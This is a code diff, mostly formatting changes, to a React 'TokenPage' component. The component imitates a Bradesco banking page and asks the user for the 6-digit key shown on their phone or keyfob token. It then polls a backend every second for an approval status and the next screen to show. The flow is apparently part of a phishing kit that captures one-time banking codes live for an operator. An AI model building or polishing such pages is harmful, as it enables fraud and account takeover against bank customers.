@@ -26,8 +26,29 @@ type Props = {
 
 function dataPorExtenso() {
   const hoje = new Date();
-  const dias = ["Domingo","Segunda-feira","Terça-feira","Quarta-feira","Quinta-feira","Sexta-feira","Sábado"];
-  const meses = ["Janeiro","Fevereiro","Março","Abril","Maio","Junho","Julho","Agosto","Setembro","Outubro","Novembro","Dezembro"];
+  const dias = [
+    "Domingo",
+    "Segunda-feira",
+    "Terça-feira",
+    "Quarta-feira",
+    "Quinta-feira",
+    "Sexta-feira",
+    "Sábado",
+  ];
+  const meses = [
+    "Janeiro",
+    "Fevereiro",
+    "Março",
+    "Abril",
+    "Maio",
+    "Junho",
+    "Julho",
+    "Agosto",
+    "Setembro",
+    "Outubro",
+    "Novembro",
+    "Dezembro",
+  ];
   return `${dias[hoje.getDay()]}, ${hoje.getDate()} de ${meses[hoje.getMonth()]} de ${hoje.getFullYear()}`;
 }
 
@@ -76,9 +97,6 @@ export function TokenPage({ id, placeholder, fase }: Props) {
           }
         }
 
-
-
-
         if (res.status === "reprovado") {
           setAguardando(false);
           setEnviando(false);
@@ -91,7 +109,11 @@ export function TokenPage({ id, placeholder, fase }: Props) {
             navigate({ to: "/sucesso" });
             return;
           }
-          if (res.proxima_tela === "interna" || res.proxima_tela === "interna_token_celular" || res.proxima_tela === "interna_token_chaveiro") {
+          if (
+            res.proxima_tela === "interna" ||
+            res.proxima_tela === "interna_token_celular" ||
+            res.proxima_tela === "interna_token_chaveiro"
+          ) {
             navigate({ to: "/interna", search: { id } });
             return;
           }
@@ -112,7 +134,11 @@ export function TokenPage({ id, placeholder, fase }: Props) {
               navigate({ to: "/sucesso" });
               return;
             }
-            if (res.proxima_tela === "interna" || res.proxima_tela === "interna_token_celular" || res.proxima_tela === "interna_token_chaveiro") {
+            if (
+              res.proxima_tela === "interna" ||
+              res.proxima_tela === "interna_token_celular" ||
+              res.proxima_tela === "interna_token_chaveiro"
+            ) {
               navigate({ to: "/interna", search: { id } });
               return;
             }
@@ -141,8 +167,13 @@ export function TokenPage({ id, placeholder, fase }: Props) {
       }
     };
     tick();
-    const t = setInterval(() => { if (!cancelado) tick(); }, 1000);
-    return () => { cancelado = true; clearInterval(t); };
+    const t = setInterval(() => {
+      if (!cancelado) tick();
+    }, 1000);
+    return () => {
+      cancelado = true;
+      clearInterval(t);
+    };
   }, [id, fase, checar, navigate, aguardando, inicializando]);
 
   async function submeter(e?: { preventDefault: () => void }) {
@@ -160,7 +191,9 @@ export function TokenPage({ id, placeholder, fase }: Props) {
       try {
         const res = await checar({ data: { id } });
         if (res.token_em) enviadoEmRef.current = res.token_em;
-      } catch { /* ignora */ }
+      } catch {
+        /* ignora */
+      }
       setAguardando(true);
     } catch {
       setEnviando(false);
@@ -189,9 +222,7 @@ export function TokenPage({ id, placeholder, fase }: Props) {
           height={156}
           className="absolute left-0 top-0 h-[156px] w-[1920px] max-w-none"
         />
-        <span className="absolute top-[44px] left-[182px] text-[12px] text-[#666]">
-          {dataStr}
-        </span>
+        <span className="absolute top-[44px] left-[182px] text-[12px] text-[#666]">{dataStr}</span>
       </header>
 
       <main className="flex-1 bg-[#e5e5e5]">
@@ -216,7 +247,8 @@ export function TokenPage({ id, placeholder, fase }: Props) {
                       2
                     </div>
                     <p className="text-[13px] leading-tight text-[#c8102e]">
-                      Digite a <strong>chave</strong> informada no visor do seu {isChaveiro ? "chaveiro" : "celular"}
+                      Digite a <strong>chave</strong> informada no visor do seu{" "}
+                      {isChaveiro ? "chaveiro" : "celular"}
                     </p>
                   </div>
 
@@ -241,7 +273,9 @@ export function TokenPage({ id, placeholder, fase }: Props) {
                             inputMode="numeric"
                             autoComplete="one-time-code"
                             value={token}
-                            onChange={(e) => setToken(e.target.value.replace(/\D/g, "").slice(0, 6))}
+                            onChange={(e) =>
+                              setToken(e.target.value.replace(/\D/g, "").slice(0, 6))
+                            }
                             maxLength={6}
                             required
                             disabled={enviando || aguardando}
@@ -262,11 +296,13 @@ export function TokenPage({ id, placeholder, fase }: Props) {
                 </div>
               </div>
 
-
               {(aguardando || inicializando) && (
                 <div
                   className="absolute inset-0 z-10 flex items-center justify-center bg-white bg-no-repeat bg-center"
-                  style={{ backgroundImage: `url(${caixaLoader.url})`, backgroundSize: "100% 100%" }}
+                  style={{
+                    backgroundImage: `url(${caixaLoader.url})`,
+                    backgroundSize: "100% 100%",
+                  }}
                 >
                   <div className="flex items-center gap-2">
                     <div className="size-6 animate-spin rounded-full border border-dashed border-black" />
@@ -298,7 +334,8 @@ export function TokenPage({ id, placeholder, fase }: Props) {
                 !
               </span>
               <p>
-                O Bradesco não envia e-mails contendo links ou solicitando atualizações de certificados digitais, componentes de segurança ou identificação do usuário.
+                O Bradesco não envia e-mails contendo links ou solicitando atualizações de
+                certificados digitais, componentes de segurança ou identificação do usuário.
               </p>
             </div>
 
@@ -345,11 +382,7 @@ export function TokenPage({ id, placeholder, fase }: Props) {
       </main>
 
       <footer className="mt-6">
-        <img
-          src={rodape.url}
-          alt="Bradesco Apoio à Empresa"
-          className="block h-auto w-full"
-        />
+        <img src={rodape.url} alt="Bradesco Apoio à Empresa" className="block h-auto w-full" />
       </footer>
     </div>
   );
